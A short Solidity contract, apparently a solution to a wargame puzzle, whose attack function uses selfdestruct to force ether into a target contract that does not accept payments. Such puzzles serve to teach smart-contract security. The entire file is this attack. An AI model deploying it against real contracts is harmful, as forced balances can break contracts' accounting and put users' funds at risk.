// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    function attack(address payable target) external payable {
        selfdestruct(target);
    }
}